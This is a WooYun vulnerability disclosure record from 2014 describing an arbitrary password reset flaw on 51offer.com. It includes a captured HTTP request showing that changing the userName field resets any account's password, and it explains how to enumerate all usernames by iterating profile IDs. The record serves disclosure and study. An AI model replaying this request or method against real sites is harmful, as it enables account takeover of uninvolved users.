{"id": 48422, "wybug_id": "wooyun-2014-083042", "wybug_title": "51offer.com任意用户密码重置", "wybug_corp": "51offer.com", "wybug_author": "BMa", "wybug_date": "2014-11-13 10:06", "wybug_open_date": "2014-12-28 10:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向公众公开  简要描述： 51offer.com任意用户密码重置-和美女一起留洋 详细说明：  首先找一个用户，这次演示的是这位：\n\n然后我们自己注册账号，找回密码，到输入密码的地方：\n\n然后抓包：\nPOST /index!updatePassword.action HTTP/1.1Host: www.51offer.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.51offer.com/restPassword.html?uid=325485B95433A536E25357AC763F1308495E9CE4E594B2611D7DAC5BBA4210E7&datetime=f9379c5427d188e8e4e3206a6f369742Cookie: bdshare_firstime=1415784723848; JSESSIONID=FE50A6CA2129D9F5C5119114094EF8C7; ssid=eetb97kn36qemcnhq4gklbal33; cookieId=697f9d28ee811b29e734922ea2c209f8; src=0; _ga=GA1.2.1134356644.1415785874; _gat=1X-Forwarded-For: 8.8.8.8Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 75userName=alwing&password=blackmanba123&password2=blackmanba123&resultValue=\n修改userName为目标用户，GO<看看这里是有userName一个参数影响密码重置，也就意味着我们只需要跑一张用户表即可重置所有用户的密码><获取用户名的方法：http://q.51offer.com/user/260251.html，在burpsuite里面跑一下ID，然后match字段即可得到所有用户的用户名>:\n\n登录看看：\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 BMa@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-11-13 14:23 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}